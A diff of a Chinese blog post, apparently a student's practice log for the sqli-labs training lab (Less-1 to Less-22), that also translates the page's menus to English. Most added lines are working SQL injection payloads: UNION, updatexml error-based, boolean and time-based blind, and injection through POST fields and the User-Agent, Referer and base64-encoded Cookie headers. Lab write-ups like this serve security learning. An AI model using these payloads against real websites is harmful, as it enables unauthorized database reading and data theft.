@@ -64,7 +64,7 @@
                             <a class=""
                                href="/"
                             >
-                                首页
+                                HOME
                             </a>
                         </li>
                     
@@ -72,7 +72,7 @@
                             <a class=""
                                href="/archives"
                             >
-                                归档
+                                ARCHIVES
                             </a>
                         </li>
                     
@@ -80,7 +80,7 @@
                             <a class=""
                                href="/categories"
                             >
-                                分类
+                                CATEGORIES
                             </a>
                         </li>
                     
@@ -88,7 +88,7 @@
                             <a class=""
                                href="/tags"
                             >
-                                标签
+                                TAGS
                             </a>
                         </li>
                     
@@ -115,22 +115,22 @@
             
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/">首页</a>
+                       href="/">HOME</a>
                 </li>
             
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/archives">归档</a>
+                       href="/archives">ARCHIVES</a>
                 </li>
             
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/categories">分类</a>
+                       href="/categories">CATEGORIES</a>
                 </li>
             
                 <li class="drawer-menu-item flex-center">
                     <a class=""
-                       href="/tags">标签</a>
+                       href="/tags">TAGS</a>
                 </li>
             
         </ul>
@@ -208,12 +208,12 @@
     
     
         <span class="article-wordcount article-meta-item">
-            <i class="fas fa-file-word"></i>&nbsp;<span>361 字</span>
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.8k Words</span>
         </span>
     
     
         <span class="article-min2read article-meta-item">
-            <i class="fas fa-clock"></i>&nbsp;<span>1 分钟</span>
+            <i class="fas fa-clock"></i>&nbsp;<span>8 Mins</span>
         </span>
     
     
@@ -232,7 +232,59 @@
             <h1 id="sqli-labs-SQL基础学习过程中的练习记录"><a href="#sqli-labs-SQL基础学习过程中的练习记录" class="headerlink" title="sqli-labs  SQL基础学习过程中的练习记录"></a>sqli-labs  SQL基础学习过程中的练习记录</h1><blockquote>
 <p>注入技巧使用优先级是：UNION注入&gt;报错注入&gt;布尔盲注&gt;时间盲注</p>
 </blockquote>
-<h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>测试注入型</p>
+<h1 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h1><h2 id="判断闭合形式"><a href="#判断闭合形式" class="headerlink" title="判断闭合形式"></a>判断闭合形式</h2><p>注入过程中一大关键点是对注入点闭合形式的判断</p>
+<p>而这判断，九分就靠猜测</p>
+<p>举Less-7为例（刚好做到这题想着整理一下，没有瞧不起其他题的意思）</p>
+<p>猜测其闭合形式为((‘’))</p>
+<p>访问</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) and 1=1--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210320163756043.png"
+                      alt="image-20210320163756043"
+                ></p>
+<p>输出正常</p>
+<p>访问</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) and 1=2--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210320163831996.png"
+                      alt="image-20210320163831996"
+                ></p>
+<p>页面报错</p>
+<p>这就证明了我们的猜测是正确的</p>
+<p>如若猜测错误</p>
+<p>访问</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot;)) and 1=1--+</span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210320164051996.png"
+                      alt="image-20210320164051996"
+                ></p>
+<p>页面显示正常</p>
+<p>但是，当访问</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot;)) and 1=2--+</span><br></pre></td></tr></table></figure>
+
+<p>页面没有发生变化</p>
+<p>而正常情况下，由于1=2是错误的，页面应报错或无回显</p>
+<h2 id="两个重要系统变量"><a href="#两个重要系统变量" class="headerlink" title="两个重要系统变量"></a>两个重要系统变量</h2><p>@@datadir 读取数据库路径</p>
+<p>@@basedir 读取MySQL路径</p>
+<p>示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-1</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,@@datadir,@@basedir--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210322153208065.png"
+                      alt="image-20210322153208065"
+                ></p>
+<h1 id="题目（GET）"><a href="#题目（GET）" class="headerlink" title="题目（GET）"></a>题目（GET）</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><h3 id="①普通联合"><a href="#①普通联合" class="headerlink" title="①普通联合"></a>①普通联合</h3><p>测试注入型</p>
 <p>访问id=2与id=3-1回显不同，排除数字型注入</p>
 <p>访问id=1a与id=1回显相同，即可判断该注入点为字符型注入</p>
 <p>访问</p>
@@ -273,6 +325,15 @@
                       alt="image-20210316203905708"
                 ></p>
 <p>查询其他表用类似查询语句即可</p>
+<h3 id="②报错注入"><a href="#②报错注入" class="headerlink" title="②报错注入"></a>②报错注入</h3><p>亦可使用报错注入，示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="③布尔盲注"><a href="#③布尔盲注" class="headerlink" title="③布尔盲注"></a>③布尔盲注</h3><p>布尔盲注，示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,length(database())&gt;=1--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="④时间盲注"><a href="#④时间盲注" class="headerlink" title="④时间盲注"></a>④时间盲注</h3><p>时间盲注，示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,if(length(database())&gt;1,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>
+
 <h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>访问id=2与id=3-1回显相同，即为数字型注入</p>
 <p>如Less-1使用union联合注入</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br></pre></td></tr></table></figure>
@@ -283,9 +344,215 @@
 <p>id闭合使用(‘’)</p>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span></span><br></pre></td></tr></table></figure>
 
+<h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>同三</p>
+<p>闭合方式不同</p>
+<p>该题的闭合方式是(“”)</p>
+<p>访问</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">-1</span>&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure>
 
+<h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>简单判断注入类型</p>
+<p>尝试报错注入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>
 
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210320155657209.png"
+                      alt="image-20210320155657209"
+                ></p>
+<p>将插在中间的查询语句修改为其他查询语句，即可开始查询</p>
+<p>示例：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</span></span><br></pre></td></tr></table></figure>
 
+<h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>同Less-5</p>
+<p>报错注入</p>
+<p>闭合方式不同，使用””闭合</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>先找出闭合方式</p>
+<p>闭合方式为((‘’))</p>
+<p>啥都没显示，选择盲注</p>
+<p>布尔盲注</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) and length(database())&gt;=1--+</span></span><br></pre></td></tr></table></figure>
+
+<p>时间盲注</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) and if(length(database())&gt;1,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>
+
+<p>其实，根据题目提示，这题本该使用’outfile’进行相关注入</p>
+<p>但经过尝试，出现一些问题，目前没有解决，所以先使用盲注</p>
+<p>相比于其他注入</p>
+<p>布尔盲注与时间盲注更为麻烦</p>
+<h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>寻找闭合，闭合方式为’’</p>
+<p>布尔盲注</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())&gt;=1--+</span></span><br></pre></td></tr></table></figure>
+
+<p>时间盲注</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length(database())&gt;1,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>随便输入啥都没有变化</p>
+<p>盲猜闭合方式就是普通的’’</p>
+<p>由于没报错回显，只能使用时间盲注</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and if(length(database())&gt;1,sleep(5),1)--+</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>同Less-9</p>
+<p>闭合方式改变，为””</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot; and if(length(database())&gt;1,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<h1 id="题目（POST）"><a href="#题目（POST）" class="headerlink" title="题目（POST）"></a>题目（POST）</h1><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><h3 id="①普通联合-1"><a href="#①普通联合-1" class="headerlink" title="①普通联合"></a>①普通联合</h3><p>第十一题开始就为POST型注入</p>
+<p>POST与GET其实大同小异</p>
+<p>仅是注入的位置发生改变，注入的方法没有改变</p>
+<p>这里使用Burp Suite来修改POST值</p>
+<p>选择uname作为SQL语句的输入点，passwd可随意输入</p>
+<p>首先还是判断闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;or 1=1--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210323200939603.png"
+                      alt="image-20210323200939603"
+                ></p>
+<p>即闭合方式为’’</p>
+<p>判断字段数</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;order by 3--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210323200224093.png"
+                      alt="image-20210323200224093"
+                ></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;order by 2--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<p>没有任何回显，即字段数为2</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<p>即可在1或2位置插入查询语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210323201320523.png"
+                      alt="image-20210323201320523"
+                ></p>
+<h3 id="②报错注入-1"><a href="#②报错注入-1" class="headerlink" title="②报错注入"></a>②报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210323201544567.png"
+                      alt="image-20210323201544567"
+                ></p>
+<h3 id="③布尔盲注-1"><a href="#③布尔盲注-1" class="headerlink" title="③布尔盲注"></a>③布尔盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,length(database())&gt;=1--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210323201824099.png"
+                      alt="image-20210323201824099"
+                ></p>
+<h3 id="④时间盲注-1"><a href="#④时间盲注-1" class="headerlink" title="④时间盲注"></a>④时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,if(length(database())&gt;1,sleep(5),1)--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210323201720691.png"
+                      alt="image-20210323201720691"
+                ></p>
+<h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>相比于上一题，闭合方式发生了改变</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span>&quot;) union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>啥回显都没有，选择时间盲注</p>
+<p>较为麻烦的在于判断闭合方式</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;)union select 1,if(length(database())&gt;1,sleep(5),1)--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><p>同上，闭合方式””</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span>&quot; union select 1,if(length(database())&gt;1,sleep(5),1)--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><p>同上，闭合方式’’</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;union select 1,if(length(database())&gt;1,sleep(5),1)--+&amp;passwd=123&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><p>同上，闭合方式(“”)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span><span class="number">-1</span>&quot;) union select 1,if(length(database())&gt;1,sleep(5),1)--+&amp;passwd=123&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>报错注入</p>
+<p>需提前知道用户名</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin<span class="operator">&amp;</span>passwd<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)--+&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h2><p>在User-Agent上输入注入语句</p>
+<p>且要保证用户名与密码是正确的</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=Dumb&amp;passwd=Dumb&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent:<span class="string">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) and&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>注入点：Referer</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="string">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)and&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>注意，这里在Referer注入时，需将原Referer的内容删除，笔者就是因为最开始没有删除，走了很多弯路</li>
+</ul>
+<p>错误注入：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210329185644513.png"
+                      alt="image-20210329185644513"
+                ></p>
+<p>正确注入：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210329185748385.png"
+                      alt="image-20210329185748385"
+                ></p>
+<h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>附：找到一个Less-20，21，22讲得很细的<a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/105525398" >博客<i class="fas fa-external-link-alt"></i></a></p>
+<p>注入点：Cookie</p>
+<p>与普通的联合注入方法相同</p>
+<p>order by 查询字段数</p>
+<p>union联合查询即可</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:<span class="number">-1</span><span class="string">&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210329202607121.png"
+                      alt="image-20210329202607121"
+                ></p>
+<p>结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210329202741925.png"
+                      alt="image-20210329202741925"
+                ></p>
+<h2 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h2><p>任意用户登录后，发现Cookie值与上一题有所不同</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210329203322169.png"
+                      alt="image-20210329203322169"
+                ></p>
+<p>判断该值为base64加密</p>
+<p>将查询语句使用base64加密再进行注入</p>
+<p>闭合方式：(‘’)</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:<span class="number">-1</span><span class="string">&#x27;)union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</span></span><br></pre></td></tr></table></figure>
+
+<p>base64编码后</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:LTEnKXVuaW9uIHNlbGVjdCAxLDIsZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKSM<span class="operator">=</span></span><br></pre></td></tr></table></figure>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/img/image-20210329204043644.png"
+                      alt="image-20210329204043644"
+                ></p>
+<h2 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h2><p>同上</p>
+<p>闭合方式””</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:<span class="number">-1</span>&quot;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br></pre></td></tr></table></figure>
+
+<p>base64编码后：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:LTEidW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpIw<span class="operator">=</span><span class="operator">=</span></span><br></pre></td></tr></table></figure>
 
 
         </div>
@@ -303,7 +570,7 @@
                         >
                             <span class="title flex-center">
                                 <span class="post-nav-title-item">SQL-SQL注入进阶与绕过技术</span>
-                                <span class="post-nav-item">下一篇</span>
+                                <span class="post-nav-item">Next posts</span>
                             </span>
                             <span class="right arrow-icon flex-center">
                               <i class="fas fa-chevron-right"></i>
@@ -339,18 +606,18 @@
             <div class="website-count info-item">
                 
                     <span id="busuanzi_container_site_uv">
-                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                     </span>
                 
                 
                     <span id="busuanzi_container_site_pv">
-                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
                     </span>
                 
             </div>
         
         <div class="theme-info info-item">
-            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.1</a>
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.1</a>
         </div>
         
     </div>
@@ -425,7 +692,7 @@
         <aside class="page-aside">
             <div class="post-toc-wrap">
     <div class="post-toc">
-        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqli-labs-SQL%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">sqli-labs  SQL基础学习过程中的练习记录</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-1"><span class="nav-number">1.1.</span> <span class="nav-text">Less-1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-2"><span class="nav-number">1.2.</span> <span class="nav-text">Less-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-3"><span class="nav-number">1.3.</span> <span class="nav-text">Less-3</span></a></li></ol></li></ol>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sqli-labs-SQL%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E8%BF%87%E7%A8%8B%E4%B8%AD%E7%9A%84%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">sqli-labs  SQL基础学习过程中的练习记录</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="nav-number">2.</span> <span class="nav-text">注意点</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E5%BD%A2%E5%BC%8F"><span class="nav-number">2.1.</span> <span class="nav-text">判断闭合形式</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%A4%E4%B8%AA%E9%87%8D%E8%A6%81%E7%B3%BB%E7%BB%9F%E5%8F%98%E9%87%8F"><span class="nav-number">2.2.</span> <span class="nav-text">两个重要系统变量</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%EF%BC%88GET%EF%BC%89"><span class="nav-number">3.</span> <span class="nav-text">题目（GET）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-1"><span class="nav-number">3.1.</span> <span class="nav-text">Less-1</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%91%A0%E6%99%AE%E9%80%9A%E8%81%94%E5%90%88"><span class="nav-number">3.1.1.</span> <span class="nav-text">①普通联合</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%91%A1%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="nav-number">3.1.2.</span> <span class="nav-text">②报错注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%91%A2%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.1.3.</span> <span class="nav-text">③布尔盲注</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%91%A3%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-number">3.1.4.</span> <span class="nav-text">④时间盲注</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-2"><span class="nav-number">3.2.</span> <span class="nav-text">Less-2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-3"><span class="nav-number">3.3.</span> <span class="nav-text">Less-3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-4"><span class="nav-number">3.4.</span> <span class="nav-text">Less-4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-5"><span class="nav-number">3.5.</span> <span class="nav-text">Less-5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Less-6"><span 